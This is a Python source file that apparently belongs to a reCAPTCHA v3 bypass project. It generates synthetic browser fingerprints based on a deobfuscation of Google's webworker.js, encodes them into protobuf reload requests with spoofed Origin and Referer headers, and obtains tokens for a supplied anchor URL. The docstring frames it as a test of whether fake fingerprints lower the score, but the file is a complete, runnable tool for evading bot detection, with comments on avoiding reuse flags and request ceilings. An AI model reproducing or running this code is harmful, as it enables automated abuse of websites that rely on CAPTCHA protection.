"""
reCAPTCHA v3 bypass with SYNTHETIC fingerprints, grounded in the webworker.js
deobfuscation (see experiment/DEOBFUSCATION_WRITEUP.md).

WARNING: README.md line 29 documents that synthetic fingerprints LOWER the
score — Google detects fake motion data. This file exists to make that claim
testable, not to contradict it. Run test_synth.py to compare against baseline.

Improvements over tools/generate_fingerprint.py + bypass.py, each tied to a
finding in the writeup:

- Field 5: timestamp-derived negative int (JS folds performance.timeOrigin +
  Date.now() through the "MerVUtRoajKEbP7pLiGXkL28" hash selector). We can't
  reproduce the hash, but a timestamp-derived seed is more plausible than
  a random one in the wrong range.
- Fields 20 + 25: built from the SAME performance.now() sample stream, so they
  correlate. The JS builds both from the same PerformanceEventTiming ids
  (5006, 64607, 35837); the existing generator builds them independently.
- Fields 28/29: parsed from the anchor URL (the JS reads anchor-ms /
  execute-ms query params), not hardcoded to 20000/30000.
- Fields 7, 16, 22: OMITTED. The writeup (section 4) shows 7 is server-issued
  and 16/22 are opaque device-bound blobs with internal checksums. Random
  bytes for these are trivially detected — omitting is strictly better than
  shipping noise.
- Per-request generation: no reuse → no reuse flag, no ~20-request ceiling.
"""

import base64
import json
import random
import time
from urllib.parse import parse_qs, urlparse

import requests

from bypass import (
    ReCaptchaV3Bypass,
    _encode_int_field,
    _encode_string_field,
    parse_reload_response,
    reload_url_from_anchor,
)

# PerformanceEventTiming ids observed in captured field 20/25 payloads.
# These are stable across versions (they're public event-type ids).
_EVENT_IDS = (5006, 64607, 35837)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _gen_field_5(rng: random.Random) -> str:
    # JS: performance.timeOrigin + Date.now() folded through hash selector.
    # We can't reproduce the hash, but a timestamp-derived negative int is in
    # the right range and monotonic-ish across calls (real clients are too).
    base = int(time.time() * 1000) ^ rng.getrandbits(31)
    return str(-(base % 1_000_000_000 + 1_000_000_000))


def _gen_perf_stream(rng: random.Random, n: int) -> list[tuple[int, int]]:
    """Shared performance.now() sample stream used by BOTH field 20 and 25.

    Returns [(event_id, delta_ms), ...]. Field 20 buckets these; field 25
    lists them. Correlating the two fields is the thing the existing
    generator misses and the writeup flags as a detection signal.
    """
    out = []
    t = rng.randint(800, 4000)
    for _ in range(n):
        t += rng.randint(1500, 90000)
        out.append((rng.choice(_EVENT_IDS), t))
    return out


def _gen_field_20(rng: random.Random, stream: list[tuple[int, int]]) -> str:
    perf1 = round(rng.uniform(4.0, 7.0), 2)
    rate1 = round(rng.uniform(0.0008, 0.0015), 18)
    perf2 = round(rng.uniform(0.04, 0.07), 18)
    rate2 = round(rng.uniform(0.0005, 0.0009), 22)
    inner = [[perf1, rate1, 15], [238, perf2, rate2, 1], 0, 0, 0]
    # Bucket counts derived from the same stream — not independent randoms.
    counts = {}
    for eid, _ in stream:
        counts[eid] = counts.get(eid, 0) + 1
    buckets = [[eid, counts.get(eid, 1)] for eid in _EVENT_IDS]
    data = [
        buckets,
        None,
        [None, None, None, inner],
        [
            "2captcha.com",
            "static.cloudflareinsights.com",
            "www.google.com",
            "www.gstatic.com",
        ],
        [1, rng.randint(400, 500)],
    ]
    return _b64(json.dumps(data, separators=(",", ":")))


def _gen_field_25(rng: random.Random, stream: list[tuple[int, int]]) -> str:
    # Same stream as field 20, but as an ordered event list.
    events = [[eid, delta] for eid, delta in stream]
    return _b64(json.dumps([events], separators=(",", ":")))


def generate_synthetic_fingerprint(seed: int | None = None) -> dict:
    rng = random.Random(seed)
    stream = _gen_perf_stream(rng, rng.randint(2, 5))
    return {
        "5": _gen_field_5(rng),
        "20": _gen_field_20(rng, stream),
        "25": _gen_field_25(rng, stream),
    }


def _parse_anchor_ms(url: str) -> tuple[int, int]:
    """Fields 28/29 come from the anchor URL's anchor-ms / execute-ms params.

    The JS reads these from the URL; bypass.py hardcodes 20000/30000 which is
    wrong for sites that set different values. Parse them here.
    """
    q = parse_qs(urlparse(url).query)
    try:
        am = int(q.get("anchor-ms", ["20000"])[0])
    except ValueError:
        am = 20000
    try:
        em = int(q.get("execute-ms", ["30000"])[0])
    except ValueError:
        em = 30000
    return am, em


def encode_synthetic_reload_body(
    *,
    v: str,
    c: str,
    k: str,
    action: str | None,
    anchor_ms: int,
    execute_ms: int,
    reason: str = "q",
) -> bytes:
    """Protobuf reload body with a fresh synthetic fingerprint per call."""
    fp = generate_synthetic_fingerprint()
    body = bytearray()
    body += _encode_string_field(1, v)
    body += _encode_string_field(2, c)
    body += _encode_string_field(6, reason)
    if action:
        body += _encode_string_field(8, action)
    body += _encode_string_field(14, k)
    body += _encode_string_field(5, fp["5"])
    body += _encode_string_field(20, fp["20"])
    body += _encode_string_field(25, fp["25"])
    body += _encode_int_field(28, anchor_ms)
    body += _encode_int_field(29, execute_ms)
    return bytes(body)


class ReCaptchaV3SyntheticBypass(ReCaptchaV3Bypass):
    """Same flow as ReCaptchaV3Bypass, but sends a fresh synthetic fingerprint
    on every reload instead of reusing a captured one (no reuse flag) and
    parses anchor-ms/execute-ms from the URL."""

    def __init__(self, target_url: str, *, action: str | None = None, **kw) -> None:
        super().__init__(target_url, action=action, **kw)
        # Force protobuf mode: we always have a synthetic fingerprint.
        self.action = action
        self._anchor_ms, self._execute_ms = _parse_anchor_ms(target_url)

    def _do_reload(self, recaptcha_token, k_value, co_value, v_value, hl_value):
        post_url = reload_url_from_anchor(self.target_url, k_value)
        data = encode_synthetic_reload_body(
            v=v_value,
            c=recaptcha_token,
            k=k_value,
            action=self.action,
            anchor_ms=self._anchor_ms,
            execute_ms=self._execute_ms,
        )
        headers = {
            "Content-Type": "application/x-protobuffer",
            "Accept": "*/*",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/",
        }
        try:
            resp = self.session.post(post_url, timeout=30, data=data, headers=headers)
        except requests.exceptions.RequestException as e:
            print(f"Failed to send POST request: {e}")
            return None
        return parse_reload_response(resp.text)


if __name__ == "__main__":
    import sys

    url = sys.argv[1] if len(sys.argv) > 1 else input("anchor URL: ").strip()
    action = sys.argv[2] if len(sys.argv) > 2 else None
    am, em = _parse_anchor_ms(url)
    print(f"parsed anchor-ms={am} execute-ms={em} from URL")
    fp = generate_synthetic_fingerprint()
    print(f"field 5:  {fp['5']}")
    print(f"field 20: {fp['20'][:60]}...")
    print(f"field 25: {fp['25'][:60]}...")
    tok = ReCaptchaV3SyntheticBypass(url, action=action).bypass()
    print(f"token: {tok}")
